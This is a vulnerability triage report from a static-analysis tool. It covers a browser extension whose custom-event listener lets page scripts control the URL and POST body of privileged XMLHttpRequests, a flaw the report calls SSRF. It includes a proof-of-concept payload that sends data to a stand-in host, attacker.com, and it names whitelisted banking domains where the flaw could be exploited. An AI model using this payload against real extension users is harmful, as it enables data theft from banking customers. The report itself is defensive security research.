# CoCo Analysis: kpjlagdjpaiimnecdbdcndjcijoalbla

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 10 (9 XMLHttpRequest_url_sink, 1 XMLHttpRequest_post_sink)

---

## Sink: cs_window_eventListener_linkerMsg → XMLHttpRequest_url_sink & XMLHttpRequest_post_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kpjlagdjpaiimnecdbdcndjcijoalbla/opgen_generated_files/cs_0.js
Line 475 - notifyBackgroundPage function receives event
Line 478 - browser.runtime.sendMessage sends e.detail to background

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kpjlagdjpaiimnecdbdcndjcijoalbla/opgen_generated_files/bg.js
Line 1201-1294 - Background handler uses attacker-controlled data in XMLHttpRequest

**Code:**

```javascript
// Content script - cs_0.js (original extension code after line 465)
function notifyBackgroundPage(e) {
    window.dispatchEvent(new CustomEvent('msgReceived'))
    browser.runtime.sendMessage({linkerMsg: e.detail}, handleResponse); // ← attacker-controlled
}

window.addEventListener("linkerMsg", notifyBackgroundPage); // ← entry point

// Background script - bg.js (original extension code after line 1170)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    var linkerMsg = request.linkerMsg; // ← attacker-controlled

    switch (linkerMsg.command) {
        case "sendMessageV1":
            var providerMsg = linkerMsg.params.providerMsg; // ← attacker-controlled
            var timeout = PROVIDER_COMM_TIMEOUT_GAP;
            if (typeof providerMsg.timeout != "undefined") {
                timeout = providerMsg.timeout * TIMEOUT_LAP;
            }
            try {
                xmlHttp = new XMLHttpRequest();
                var nuevaUrl;
                var inicio = providerMsg.url.length - 5; // ← attacker-controlled URL
                var fin = providerMsg.url.length - 1;

                // Various URL manipulations based on localStorage settings
                nuevaUrl = providerMsg.url; // ← attacker-controlled

                // Attacker controls the complete URL path including protocol and operation
                xmlHttp.open(DEFAULT_COMPONENT_METHOD,
                    nuevaUrl + providerMsg.protocol + "/" + providerMsg.operation, true);
                    // ← All three parts (nuevaUrl, protocol, operation) are attacker-controlled

                xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                xmlHttp.timeout = timeout;

                xmlHttp.onload = function() {
                    try {
                        var resp = JSON.parse(xmlHttp.responseText);
                        sendResponse(new ExtensionResponse(new OpResult(AlisonShrConst.OP_SUCCESS), resp));
                    } catch(e) {
                        sendResponse(new ExtensionResponse(new OpResult(AlisonShrConst.OP_ERROR,
                            AlisonShrConst.ERR_PROVIDER_COMM_EXCEPTION, e.name)));
                    }
                }

                if (providerMsg.params == null) {
                    xmlHttp.send("URL=" + sender.url);
                } else {
                    xmlHttp.send(providerMsg.params + "&URL=" + sender.url);
                    // ← attacker controls POST body via providerMsg.params
                }
            } catch(e) {
                sendResponse(new ExtensionResponse(new OpResult(AlisonShrConst.OP_ERROR,
                    AlisonShrConst.ERR_PROVIDER_COMM_EXCEPTION, e.name)));
            }
            break;
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom event listener

**Attack:**

```javascript
// Attacker page running on one of the whitelisted domains
// (e.g., malicious script injected on certisur.com, santanderrio.com.ar, etc.)

// Craft malicious XMLHttpRequest to attacker-controlled server
var maliciousPayload = {
    command: "sendMessageV1",
    params: {
        providerMsg: {
            url: "http://attacker.com:8080/",  // Attacker's server
            protocol: "steal",
            operation: "credentials",
            params: "data=sensitive_info",  // Control POST body
            timeout: 5000
        }
    }
};

// Trigger the vulnerability via custom event
window.dispatchEvent(new CustomEvent('linkerMsg', {
    'detail': maliciousPayload
}));

// The extension will make XMLHttpRequest to:
// http://attacker.com:8080/steal/credentials
// With POST body: "data=sensitive_info&URL=<victim_page_url>"
```

**Impact:** Server-Side Request Forgery (SSRF) with full control over the request. The attacker can:
1. Make privileged cross-origin requests to arbitrary URLs from the extension's context
2. Control the complete URL (host, port, path)
3. Control the HTTP method (POST via xmlHttp.send)
4. Control the POST body parameters
5. Exfiltrate data by sending it to attacker-controlled servers
6. Access internal network resources that the victim's machine can reach
7. The response from xmlHttp.onload is sent back to the content script via sendResponse, potentially leaking responses from internal services

**Note:** While the manifest restricts content scripts to specific domains (certisur.com, santanderrio.com.ar, etc.), per the methodology we ignore manifest restrictions. If an attacker can inject code on any of these whitelisted domains (XSS, compromised subdomain, etc.), they can exploit this vulnerability. Even exploitation on just ONE of these financial services domains constitutes a TRUE POSITIVE.
